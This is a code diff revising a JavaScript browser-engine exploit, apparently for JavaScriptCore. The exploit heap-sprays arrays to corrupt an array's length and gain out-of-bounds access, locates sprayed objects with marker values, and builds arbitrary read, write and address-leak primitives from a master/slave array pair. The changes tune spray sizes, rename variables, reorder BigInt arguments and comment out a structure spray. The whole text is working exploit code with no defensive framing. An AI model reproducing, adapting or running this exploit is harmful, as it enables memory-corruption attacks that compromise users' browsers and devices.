@@ -238,6 +238,7 @@ BigInt.TYPE_MAP = {
 	"Float64Array": "f64"
 }
 
+//var structs = [];
 var oob_arr, slave, master;
 var leak_target, leak_target_addr;
 
@@ -252,7 +253,7 @@ while (true) {
 	arr.length = 0xfffffff0;
 
 	var new_indexing_header = new BigInt(0x100000, 0x100000);
-	for (var i = 0; i < 0x5000; i++)
+	for (var i = 0; i < 0x8000; i++)
 	{
 	    spray[i] = new Array(0x10).fill(new_indexing_header.d());
 
@@ -270,7 +271,7 @@ while (true) {
 
 	arr.splice(0x1000, 0, 1);
 
-	for (var i = 0; i < 0x5000; i++)
+	for (var i = 0; i < 0x8000; i++)
 	{
 	    if (spray[i].length > 0x10)
 	    {
@@ -290,14 +291,14 @@ while (true) {
 log(`corrupted oob array length: ${oob_arr.length}`);
 
 while (true) {
-	var leak_prim_idx   = -1;
+	var leak_prim_idx = -1;
 	var leak_double_idx = -1;
 	var found_prim = false;
 
 	var prim_spray = [];
 
 	var prop = new BigInt(0, 0x13371337);
-	for (var i = 0; i < 0x400; i++)
+	for (var i = 0; i < 0x200; i++)
 	{
 	    prim_spray[i] = new Array(0x10);
 		prim_spray[i][0] = 13.37;
@@ -319,23 +320,23 @@ while (true) {
 	for (var i = 0; i < 0x5000; i++)
 	{
 	    var lookup_idx = 0x65000 + i;
-	    var oldVal    = oob_arr[lookup_idx];
+	    var old_val = oob_arr[lookup_idx];
 
-	    if (oldVal == undefined) {
+	    if (old_val == undefined) {
 			continue;
 		}
 
 	    oob_arr[lookup_idx] = marker.d();
 
-	    for (var k = 0; k < 0x400; k++)
+	    for (var k = 0; k < 0x200; k++)
 	    {
 	        if(prim_spray[k].length > 0x10)
 	        {
-	            found_prim       = true;
-	            leak_prim_idx   = k;
+	            found_prim = true;
+	            leak_prim_idx = k;
 	            leak_double_idx = lookup_idx;
 
-	            oob_arr[lookup_idx] = oldVal;
+	            oob_arr[lookup_idx] = old_val;
 
 	            break;
 	        }
@@ -345,7 +346,7 @@ while (true) {
 			break;
 		}
 
-	    oob_arr[lookup_idx] = oldVal;
+	    oob_arr[lookup_idx] = old_val;
 	}
 
 	if (found_prim) {
@@ -354,7 +355,7 @@ while (true) {
 		slave[0] = 0x13371337;
 
 		leak_target = {a: 0, b: 0, c: 0, d: 0};
-		leak_target.a   = slave;
+		leak_target.a = slave;
 
 		prim_spray[leak_prim_idx][1] = leak_target;
 
@@ -362,14 +363,21 @@ while (true) {
 
 		log(`leak_target_addr: ${leak_target_addr}`);
 
-		var rwTgt = {a: 0, b: 0, c: 0, d: 0};
+		//for (var i = 0; i < 0x100; i++)
+        //{
+        //    var a = new Uint32Array(1);
+        //    a[Math.random().toString(36).replace(/[^a-z]+/g, '').slice(0, 5)] = 1337;
+        //    structs.push(a);
+        //}
 
-		rwTgt.a   = new BigInt(0x00000200, 0x1602300).d();
-		rwTgt.b   = 0;
-		rwTgt.c   = slave;
-		rwTgt.d   = 0x1337;
+		var rw_target = {a: 0, b: 0, c: 0, d: 0};
 
-		prim_spray[leak_prim_idx][1] = rwTgt;
+		rw_target.a = new BigInt(0x1602300, 0x200).d();
+		rw_target.b = 0;
+		rw_target.c = slave;
+		rw_target.d = 0x1337;
+
+		prim_spray[leak_prim_idx][1] = rw_target;
 
 		var rw_target_addr = new BigInt(oob_arr[leak_double_idx+2]);
 
@@ -418,12 +426,12 @@ var prim = {
     {
         master[4] = addr.lo();
         master[5] = addr.hi();
-        slave[0]  = val;
+        slave[0] = val;
     },
     leakval: function(jsval)
     {
         leak_target.a = jsval;
-        return prim.read8(new BigInt(leak_target_addr.hi(), leak_target_addr.lo()).add(new BigInt(0, 0x10)));
+        return prim.read8(new BigInt(leak_target_addr).add(new BigInt(0, 0x10)));
     }
 };
 
